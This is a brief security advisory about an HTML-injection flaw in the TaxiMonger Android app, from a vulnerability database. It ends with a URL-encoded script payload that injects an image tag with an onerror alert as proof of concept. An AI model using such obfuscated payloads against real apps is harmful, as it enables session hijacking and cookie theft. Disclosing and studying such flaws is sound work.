source: https://www.securityfocus.com/bid/60566/info

TaxiMonger for Android is prone to an HTML-injection vulnerability because it fails to properly sanitize user-supplied input.

Successful exploits will allow attacker-supplied HTML and script code to run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible.

TaxiMonger 2.6.2 and 2.3.3 are vulnerable; other versions may also be affected. 

<Script Language='Javascript'> <!-- document.write(unescape('%3C%69%6D%61%67%65%20%73%72%63%3D%68%74%74%70%3A%2F%2F%76%75%6C%6E%2D%6C%61%62 %2E%63%6F%6D%20%6F%6E%65%72%72%6F%72%3D%61%6C%65%72%74%28%27%69%73%6D%61%69%6C%6B%61%6C%65%65%6D%27%29%20%2F%3E')); //--> </Script>